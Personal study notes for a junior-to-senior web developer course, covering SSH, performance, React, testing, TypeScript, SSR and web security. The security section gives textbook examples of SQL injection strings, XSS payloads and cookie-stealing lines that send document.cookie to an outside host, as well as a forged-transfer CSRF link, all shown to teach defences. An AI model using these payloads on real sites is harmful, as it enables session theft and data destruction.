# The Complete Junior to Senior Web Developer Roadmap (2020)

## Table of Contents

- [The Complete Junior to Senior Web Developer Roadmap (2020)](#the-complete-junior-to-senior-web-developer-roadmap-2020)
  - [Table of Contents](#table-of-contents)
  - [**Section 2: SSH**](#section-2-ssh)
  - [**Section 3: Performance Part 1**](#section-3-performance-part-1)
  - [**Section 4: React + Redux + Module Bundling**](#section-4-react--redux--module-bundling)
  - [**Section 5: Performance Part 2**](#section-5-performance-part-2)
  - [**Section 6: Testing**](#section-6-testing)
  - [**Section 7: TypeScript**](#section-7-typescript)
  - [**Section 8: SPA vs Server Side Rendering**](#section-8-spa-vs-server-side-rendering)
  - [**Section 9: Security**](#section-9-security)

## **Section 2: SSH**

- Introduction to SSH
  - HTTP: Hypertext Transfer Protocol
  - FTP: File Transfer Protocol
  - HTTPS: Hypertext Transfer Protocol Secure
  - SSH: Secure Shell Protocol
  - Host: Remote Server (OS: ubuntu)
  - Client: My computer
- SSH Command
  - SSH Command: `ssh {user}@{host}`
  - Connect to host: `ssh root@xx.xx.xx.xx`
  - Install Git: `sudo apt-get install git`
  - Install Node JS: `sudo apt-get install nodejs`
  - Install all dependencies: `apt install npm`
  - Delete all files in folder: `rm -rf dir1`
  - Delete all file: `rm file`
  - Quit host: `exit`
- Saving The Day Through SSH
  - rsync is a utility to transfer files between client and host
  - Example: `rsync -av . root@xx.xx.50xx.xx:~/superawesome.com`
- How SSH Works
  - Symmetric Encryption: use one secret key for both encryption and decryption by both parties
    - Both parties generate the secret key with public shared data using Key Exchange Algorithm
    - Secret key is specified to each SSH session
  - Asymmetric Encryption: use 2 separate secret key for encryption and decryption
    - Both parties generate temporary secret key
    - Difiie Hellman Key Exchange Algorithm
    - Encrpyt data with public key
    - Decrypt data with paired private key
  - Hashing
    - Verify the authentication of the message
    - Hash based Message Authentication codes
  - Passwords Or SSH?
    - Difiie Hellman Key Exchange
    - Arrive at Symmetric Key
    - Make sure of no funny business
    - Authenticate User
- SSH Into A Server:
  - Overview:
    - Generate public/private key pair at client
    - Share public key with host
    - SSH to host with public key at client
    - [How To Set Up SSH Keys](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2)
  - How to setup manually?
    - Client: `cd ~/.ssh`
    - Generate public/private key pair: `ssh-keygen -t rsa -b 4096 -C "test@gmail.com"`
      - Public key: id_rsa_digitalocean.pub
      - Private key: id_rsa_digitalocean
    - Copy public key to clipboard: `pbcopy < ~/.ssh/id_rsa_digitalocean.pub`
    - Host: `ssh root@xx.xx.xx.xx`
    - Show hidden files: `ls -a`
    - Goto SSH folder: `cd .ssh`
    - Open authorized_keys file: `nano authorized_keys`
    - Paste public key: `Command-v`
    - Exit authorized_keys file and save: `Ctrl-x -> Press Y -> Press Enter`
    - Quit host: `exit`
    - Client: `ssh-add ~/.ssh/id_rsa_digitalocean`
      - Add id_rsa_digitalocean private key into the SSH authentication agent for implementing single sign-on with SSH
    - Host: `ssh root@xx.xx.xx.xx`
    - Open authorized_keys file: `nano authorized_keys`
    - Delete key: Place cursor at start of key -> `ctrl-k`
  - How to setup with digital ocean interface?
    - (Top Right Corner) My profile -> (Left SideBar) Settings -> Security Tab -> SSH keys
    - Note: Add the SSH key on the control panel -> create a new server
- [Set Up SSH on Github](https://help.github.com/en/github/authenticating-to-github/connecting-to-github-with-ssh)
  - Client
    - Generate public/private key pair: `ssh-keygen -t rsa -b 4096 -C "xxx@gmail.com"`
    - Add private key to ssh-agent: `ssh-add -K ~/.ssh/id_rsa_github`
    - Copy public key to clipboard:`pbcopy < ~/.ssh/id_rsa_github.pub`
  - Github: Add new public key
    - (Top Right Corner) Settings
    - (Left Sidebar) SSH and GPG keys
    - New SSH Key
    - Ctrl-v
  - Client
    - Test SSH connection: `ssh -T git@github.com`
    - Clone repo with ssh keys: `git clone git@github.com:chesterheng/learn-formik.git`
  - Github: Check SSH key display Last used within the last week — Read/write

**[⬆ back to top](#table-of-contents)**

## **Section 3: Performance Part 1**

- Introduction to Performance Part 1
  - Client make a request to Server
  - Server return HTML
  - Client render HTML and need CSS
  - Client request CSS from Server
  - Client request Assets from Server
  - Client request JS from Server
- Visitor expect site to load within 2 sec
- In order to display website,
  - Frontend: Send GET request to Backend
  - Backend: Receive the request
  - Backend: Retrieve data from database
  - Backend: Process data and return data to Frontend
  - Frontend: Render HTML and data from Backend
- 3 Keys To Performance
  - Improve the Frontend render
  - Transfer of file, network latency
  - Improve the Backend processing
- How to improve?
  - Frontend
    - Critical Render path (Part 1)
    - Optimized Code (Part 2)
    - Progressive Web App (Part 2)
  - Transfer
    - Minimize Files (Part 1)
    - Minimize Delivery (Part 1)
  - Backend
    - CDNs (Part 3)
    - Caching (Part 3)
    - Load Balancing (Part 3)
    - DB Scaling (Part 3)
    - GZIP (Part 3)
- Network Performance
  1. Honey I shrunk the files
  2. The traveling deliveryman
- Honey I shrunk the files
- Minimize Text: HTML, CSS, JS (Revisit in Webpack)
  - [UglifyJS](https://skalman.github.io/UglifyJS-online/)
- Minimize Images
  - JPG: e.g. photograph
    - lot of colors required
    - no transparent background
  - GIF: use for small animation
  - PNG: e.g. logo
    - less colors required
    - transparent background
  - SVG: vector graphic, expand without distortion
- Resources: Image File Formats
  - [Image file formats: when to use each file type](https://99designs.com/blog/tips/image-file-types)
  - [Page Weight Tool](https://pageweight.imgix.com)
  - [GIF, PNG, JPG or SVG. Which One To Use?](https://www.sitepoint.com/gif-png-jpg-which-one-to-use)
- Image Optimizations
  - If you want transparency: use a PNG
  - If you want animations: use a GIF
  - If you want colourful images: use a JPG
  - If you want simple icons, logos, and illustions: use SVGs
  - Reduce PNG with [TinyPNG](https://tinypng.com)
  - Reduce JPG with [JPEG-optimizer](http://jpeg-optimizer.com)
  - Reduce SVG with [Nano](https://vecta.io/nano)
  - Try to choose simple illustrations over highly detailed photographs
  - Always lower JPEG image quality (30 - 60%)
  - Resize image based on size it will be displayed
  - Display different sized images for different backgrounds
    - [Media Queries](https://css-tricks.com/snippets/css/media-queries-for-standard-devices/)
    - [Media Queries Cheat Sheet](https://gist.github.com/bartholomej/8415655)
  - Use CDNs like imigx
  - [Remove image metadata](https://www.verexif.com/en/)
- Exercise: #1 - Media Queries
- The traveling deliveryman
  - Less trips: is CSS framework necessary?
  - Less trips: is JS library necessary?
  - Browser: 2-6 [max currently request](https://stackoverflow.com/questions/985431/max-parallel-http-connections-in-a-browser)
  - Combine all CSS files into one
  - Combine all JS files into one
- Exercise: #2 - Network Optimizations
  - Minimize all text: e.g. [CSS and JS Minifier](https://www.minifier.org/)
  - Minimize images
  - Media Queries
  - Minimize # of files
    ![Before](network-optimizations-before.jpg)
    ![After](network-optimizations-after.jpg)
- Critical Render Path Introduction
  - DOM -> CSSOM -> Render Tree -> Layout -> Paint
  - Client: 1. Request HTML file from server
  - Server: Return HTML file
  - Client: Parse HTML and start to build the DOM
  - Client: Request external resources from server
  - Client: 2. Request CSS file from server
  - Server: Return CSS file
  - Client: Parse CSS and start to build the CSSOM
  - Client: 3 .Request JS file from server
  - Server: Return JS file
  - Client: 4. DOMCOntentLoaded state
  - Client: Read JS file and make changes to the DOM or CSSOM
  - Client: Combine DOM and CSSOM into a render tree
  - Client: Figure out the layout and positioning with the render tree
  - Client: Paint all the pixels on the browser
  - CLient: Request photo when encounter image tag from server
  - Client: Start to download photo in the background
  - Client: Show when downloaded
  - Client: JS modified Render tree due to user trigger events
- Critical Render Path 1
  - HTML: Load style tag in the `<head>`
  - HTML: Load script right before `</body>`
- Critical Render Path 2
  - CSS: Only load whatever is needed
  - CSS: Above the fold loading: load necessary style first
  - CSS: Media Attributes
  - CSS: Less Specificity
- Critical Render Path 3
  - JS: Load Scripts asynchronously
  - JS: Defer Loading of scripts
  - JS: Minimize DOM manipulation
  - JS: Avoid long running JavaScript
  - Resource: [Loading Third-Party JavaScript](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/loading-third-party-javascript)
  - Resource: [Async + Defer](https://stackoverflow.com/questions/10808109/script-tag-async-defer)
- Critical Render Path 4
  - Download HTML -> Construct DOM
  - Download CSS -> Construct CSSOM
  - Download JS -> Modify DOM and CSSOM
  - Construct render tree with DOM and CSSOM
  - Figure layout and positioning from the render tree
  - Paint pixels on the screen
  - Load image in the background and display web page
- Exercise: #3 - Critical Render Path
- Free course: [The Critical Rendering Path](https://www.udacity.com/course/website-performance-optimization--ud884)
- Exercise: #4 - Keiko Corp Website
  - [PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)
  - [WebPageTest](https://www.webpagetest.org/)
- Resource Prefetching: [Prefetching, preloading, prebrowsing](https://css-tricks.com/prefetching-preloading-prebrowsing/)
- [Performance Tools](https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/learn/lecture/10210456#content)
- [HTTP/2](https://developers.google.com/web/fundamentals/performance/http2/)
- [HTTP/3](https://blog.cloudflare.com/http3-the-past-present-and-future/)

**[⬆ back to top](#table-of-contents)**

## **Section 4: React + Redux + Module Bundling**

- Angular vs React vs Vue (think of Pros and Cons)
- Angular: for large bank with massive codebase
- Angular: a full framework, everyone sticks to the rules
- React: for a company with a strong developer team
- React: need to be flexible and evolve by adding different libraries and tools to the ecosystems
- React: simple way of writing code
- Vue: Super easy to pick up
- Critical Render Path
  - JS Delivery
  - Minimise DOM manipulation with JS
  - Minimise re-rendering
- Why use Redux?
  - Good for managing large state
  - Useful for sharing data between containers
  - Predictable state management using the 3 principles
    - Single source of truth
    - State is read only
    - Changes using pure functions
  - Action -> Reducer -> Redux Store -> Make changes in Components
  - Resources: [Webpack 4 Configurator](http://web.jakoblind.no/webpack-config)

**[⬆ back to top](#table-of-contents)**

## **Section 5: Performance Part 2**

- Code optimization
  - Request JS
  - JS Arrives
  - Compile / Parse / Execute
  - fetch()
  - Content Arrives
  - Compile / Parse / Execute
  - Page Interactive
- Solutions
  - [Ahead-of-time (AOT) compilation](https://angular.io/guide/aot-compiler)
  - Limit animation
- Measurements
  - Time to first meaningful paint
  - Time to interactive
- Code Splitting / Progressive Bootstrapping
  - Min JS required for current page
  - Lazy load for another page when current page is interactive
- Code Splitting Technique
  - [Route-based code splitting](https://reactjs.org/docs/code-splitting.html#route-based-code-splitting)
  - Component based Code Splitting
    - Example: [react-loadable](https://github.com/jamiebuilds/react-loadable)
  - Use React.lazy and Suspense
- React Performance Optimizations
  - http://localhost:3000/?react_perf
  - See react components in performance tab
  - Redux can update any leaf component
  - Update any parent component will update all child components
  - [Why Did You Render](https://github.com/welldone-software/why-did-you-render)
- Optimizing Code Review
  - Only load what's needed:
    - Code Splitting
    - Tree Shaking
  - Avoid blocking main thread
  - Avoid memory leaks
  - Avoid multiple re-rendering
- [Tree Shaking 101](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/tree-shaking/)
- Progressive Web Apps
  - [What Web Can Do Today](https://whatwebcando.today)
  - [Lighthouse](https://developers.google.com/web/tools/lighthouse)
  - [Top PWAs](https://appsco.pe/)
  - [Pokedex](https://pokedex.org/)
  - [Hacker News readers as Progressive Web Apps](https://hnpwa.com/)
- 3 important parts
  - HTTPS
  - App Mainfest
  - Service Worker
- [Progressive Web App checklist](https://web.dev/pwa-checklist/)
- HTTPS
  - [Let's Encrypt](https://letsencrypt.org/)
  - [Cloudflare CDN](https://www.cloudflare.com/)
  - [Github Pages](https://pages.github.com)
- App Mainfest
  - [Viewport Meta Tag](https://developers.google.com/web/tools/lighthouse/audits/has-viewport-meta-tag)
  - [Favicon Generator. For real.](https://realfavicongenerator.net/)
- Service Worker
  - [Is Service Worker Ready?](https://jakearchibald.github.io/isserviceworkerready/)
  - How it work?
    1.  Request to service worker
    2.  Access Cache API (Web API)
    3.  Not available in Cache API
    4.  Request from backend
  - [create-react-pwa](https://github.com/jeffposnick/create-react-pwa/compare/starting-point...pwa)
  - [Introduction to Progressive Web Apps](https://auth0.com/blog/introduction-to-progressive-web-apps-push-notifications-part-3/)
  - [Progressive Tooling](https://progressivetooling.com/)

**[⬆ back to top](#table-of-contents)**

## **Section 6: Testing**

- Types of Tests
  - Unit Tests
  - Integration Tests
  - Automation Tests
- Testing Tools and Framework (BDD)
  - Testing libraries: Jasmine, Jest, Mocha
  - Assertion libraries: Jasmine, Jest, chai
  - Test runner: Jasmine, Jest, Mocha, Karma
    - DOM, Puppeteer, jsdom
  - Mock, Spy and Stub: Jasmine, Jest, Sinon.js
  - Code Coverage: Istanbul, Jest
    - `npm test -- --coverage`
- React Testing
  - Snapshot
  - Enzyme
- Unit Tests
  - Test pure functions
  - Don't test the contract
    - server and database
- Integration Tests
  - cross commmunications between units of code
  - Spy to ensure expect side-effect
  - Stub to mock and modify part of process (mock database call)
- Automation Tests (e2e Tests)
  - Entire process of UI Tests runnning in a browser
  - Simulate user behaviors
  - Hardest to setup (Different platform)
  - Examples: Nightwatch, Web Driver IO, TestCafe, Nightmare, Cypress
- Final Note on Testing
  - Production: App.js, DOM, Puppeteer (headless browser)
  - Development: App.test.js, jsdom
    - Read the test
    - Run the test
    - Output code coverage
- Upcoming API Endpoint
  - [Star Wars API](http://swapi.py4e.com/) or [Star Wars API (clone)](https://swapi.dev/)
  - [Numbers API](http://numbersapi.com/#42)
  - [Chuck Norris API](https://api.chucknorris.io/)
  - [Pokemon API](https://pokeapi.co/)
- [Jest Cheat Sheet](https://github.com/sapegin/jest-cheat-sheet)
- [Enzyme](https://enzymejs.github.io/enzyme/docs/api/)
  - Shallow Render (shallow): render current component only, not parent and child
  - Static Render (render): render current component and child
  - Full Render (mount): render entire dom
- [Nock](https://github.com/nock/nock)
- [SuperTest](https://github.com/visionmedia/supertest)
- [What Test is Best?](https://blog.usejournal.com/lean-testing-or-why-unit-tests-are-worse-than-you-think-b6500139a009)

**[⬆ back to top](#table-of-contents)**

## **Section 7: TypeScript**

- [Dynamic vs Static Typing](https://android.jlelse.eu/magic-lies-here-statically-typed-vs-dynamically-typed-languages-d151c7f95e2b)
- Static Typed language Pros
  - Static Typed language is self documented
  - Static Typed language help in auto-complete in IDE
  - Less bugs in production
- Static Typed language Cons
  - More Complex, more time to learn
  - Testing is still required
  - Slower development process
- Dynamic Typed language Pros
  - Less time to develop
  - More flexible
- TypeScript = JavaScript + Type Safe
- Strong Typed language
  - Cannot operate on 2 different types
- Weak Typed language
  - Type coercion
- Static Typing In Javascript
  - [Flow](https://flow.org/)
    - Static Type Checker
    - Flow -> Babel -> JS
    - [Create React App](https://flow.org/en/docs/tools/create-react-app/)
  - [Elm](https://elm-lang.org/)
  - [Reason ML](https://reasonml.github.io/)
  - [TypeScript](https://www.typescriptlang.org/)
    - [TypeScript Editor Support](https://github.com/Microsoft/TypeScript/wiki/TypeScript-Editor-Support)
    - `tsc --init`
    - `tsc typescript.ts --watch`
  - [Interface vs Type alias in TypeScript 2.7](https://medium.com/@martin_hotell/interface-vs-type-alias-in-typescript-2-7-2a8f1777af4c)
  - [Typescript: Interfaces vs. Type Aliases](https://www.briangonzalez.org/post/interface-types-vs-type-aliases-typescript)
- [Type Assertion](https://basarat.gitbook.io/typescript/type-system/type-assertion)
- [DefinitelyTyped](https://definitelytyped.org/)
- [Adding TypeScript](https://create-react-app.dev/docs/adding-typescript/)
- Small team: focus on features + unit tests + no time for typescript
- Need to make tough decision

**[⬆ back to top](#table-of-contents)**

## **Section 8: SPA vs Server Side Rendering**

- SPA - Client Side Rendering
  - More JS is send to client on initial request
  - Longer for JS to get send and execute
  - SEO performance
  - Critical Render Path
    - Barebone HTML - Nothing to be rendered
    - Wait for JS to arrive
    - Wait for JS to execute
    - Webpage is loaded
- Server Side Rendering
  - Critical Render Path
    - Server response a fully rendered page initial
    - Wait for JS to arrive
    - Wait for JS to execute
    - Webpage is loaded
- Server Side Rendering React
  - Server: ReactDOMServer.renderToNodeStream()
    - New version. Performance Improvement
  - Server: ReactDOMServer.renderToString()
  - Client: Receive a fully rendered page initial
  - Client: ReactDOM.hydrate()
  - Client: Attached event listeners to the fully rendered page

```
// server.js - ssr
import express from "express";
import React from "react";
import fs from "fs";
import { renderToString } from "react-dom/server";
import App from "/App";

const app = express();
app.use(express.static('/public'));

const robots = JSON.parse(fs.readFileSync('/public/robots.json'));
const RobotfriendsApp = React.createElement(App);
app.get('/', (request, response) => {
  response.render('index', {
    content: renderToString(RobotfriendsApp({ data: robots }))
  })
});
```

- CSR vs SSR Part 2
  - CSR Pros: Rich Interactions, Faster Response and Web Applications
  - CSR Cons: Low SEO potential, Longer initial load
  - SSR Pros: Static Sites, SEO and Initial Page Load
  - SSR Cons: Full Page Reloads, Slower page rendering, # Requests to server
- SSR React Libraries
  - [Gatsby](https://www.gatsbyjs.org/) - Static sites
  - [NEXT.js](https://nextjs.org/) - build dynamic applications
- Client Side Routing: use Link component
- Server Side Routing: use a html tag
- [Server-side vs Client-side Routing](https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f)
- [Tech tip: How to do hard refresh in Chrome, Firefox and IE?](https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.XqzusxMzZhE)
- Dynamic Apps with Next.js
  - Initial refresh: console.log on server
  - Revisiting the page: console.log on client
- [Deploying Next.js Apps](https://vercel.com/home)

**[⬆ back to top](#table-of-contents)**

## **Section 9: Security**

- Star of Security

  - Injections
  - 3rd party libraries
  - Logging
  - Https everywhere
  - XSS & CSRF
  - Code secrets
  - Secure headers
  - Access control
  - Data management
  - Don't trust anyone
  - Authentication

- Injections

  - [SQL Injection](https://www.hacksplaining.com/exercises/sql-injection)

    - eg. Add in password field: 'or 1=1--
    - eg. Insert into a new row: '; DROP TABLE users; --

    ```CREATE TABLE sqlinjection (
        id serial PRIMARY KEY,
        email text UNIQUE NOT NULL
      );

    INSERT INTO sqlinjection (email)
    VALUES (; DROP TABLE sqlinjection; --);
    ```

  - [PostgreSQL](https://www.postgresql.org/download/macosx/)
  - [PostgreSQL GUI tool for macOS](http://www.psequel.com)
  - Code injection Exercise: Start Security-server, then security-client
  - Key in `<img src='/' onerror="alert('boom')">`

- Solution:
  - Sanitize input with white and black list
  - Parametrize Queries: Use object relational mapper
  ```
    const sqlSelect = (name, email, id) => {
      if(name === number)
    }
  ```
  - [Knex.js](http://knexjs.org/) or other ORMS
- 3rd party libraries
  - [The Node Security Platform service is shutting down 9/30](https://blog.npmjs.org/post/175511531085/the-node-security-platform-service-is-shutting)
  - [Announcing npm@6](https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905)
    - `npm audit`
  - [Snyk](https://github.com/snyk/snyk)
    - `sudo npm i -g snyk`
    - `snyk auth`
    - `snyk test`
- Logging
  - [Insufficient Logging & Monitoring](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring)
  - [winston](https://github.com/winstonjs/winston)
    - advanced console log
  - [morgan](https://github.com/expressjs/morgan)
    - monitor api request
- HTTPS Everywhere - SSL/TLS Certificates
  - [Let's Encrypt](https://letsencrypt.org)
  - [Cloudflare](https://www.cloudflare.com/)
- [XSS](https://www.hacksplaining.com/exercises/xss-stored) & [CSRF](https://www.hacksplaining.com/exercises/csrf)
  - XSS: Cross Side Scripting (use for session hijack)
    - [Cross-site scripting for dummies](https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09)
    - Hacker inject malicious code into blog post
    - Malicious Code is run when user visit the blog post
    - Example: `window.location = 'www.zzz.com?cookie=' + document.cookie`
    - Send user cookie to to malicious website www.zzz.com
  - CSRF: Cross Site Request Forgery
    - Client <-> Server <-> Database
    - Client <-> 3rd Party API
    - Users log in to their netbank.com
    - Send them a malicious with the following code in the link
    - Example: `<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>`
    - Users click the link and send AttackerA \$100
    - Example 2:
    - `fetch('//httpbin.org/post',{method:'POST',body:document.cookie})`
    - Send cookie of the current login website to a malicious site
    - [httpbin.org](https://httpbin.org)
    - Solution: Block in document's Content Security Policy
  - XSS and CSRF Summary
    - Sanitize input
    - No eval()
    - No document.write()
      - Example: `document.write('<script>alert(1)</script>')`
    - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - Secure + HTTPOnly [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
      - Secure: Cookies send over https
      - HTTPOnly: Prevents cookies from being accessed by client side scripting
    - [csurf](https://github.com/expressjs/csurf)
- Code Secrets
  - [Environmental Variables](https://create-react-app.dev/docs/adding-custom-environment-variables/)
    - Add into .env. Example: `REACT_APP_API_URL=https://swapi.py4e.com/api`
  - Commit History
    - use .gitignore file to avoid commit secret or password to github
    - [Do NOT commit password to github](https://github.com/search?q=remove+password&type=Commits)
- Secure Headers
  - [helmet](https://helmetjs.github.io/)
  - [HTTP: The Protocol Every Web Developer Must Know - Part 1](https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177)
  - [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
  - [HTTP - Header Fields](https://www.tutorialspoint.com/http/http_header_fields.htm)
  - [Helmet](https://github.com/helmetjs/helmet)
- Access Control
  - Principal of least privilege
  - Example: [cors](https://github.com/expressjs/cors)
    - Don't give public access to server
    - Give access to people you trust, add a white list
- Data Management
  - bcrypt, scrypt, Aragon2
  - pgcrypto - encrypt a few columns
  - password storage
  - [How to Store User Passwords and Overcome Security Threats in 2017](https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/)
- Don't Trust Anyone (need to monitor all areas)
  - Client <-> Server <-> Database
  - Client <-> 3rd Party API
  - [ratelimiter](https://github.com/tj/node-ratelimiter)
  - How to prevent bad actors?
    -Authentication
  - Session-Based Authentication
  - Token-Based Authentication
  - Exercise: #4 - Optional [Hacking](https://www.hacksplaining.com/lessons)
  - Resource: [Personal Security](https://watchyourhack.com/)
  - Resource: [OWASP Top Ten](https://owasp.org/www-project-top-ten/)

**[⬆ back to top](#table-of-contents)**
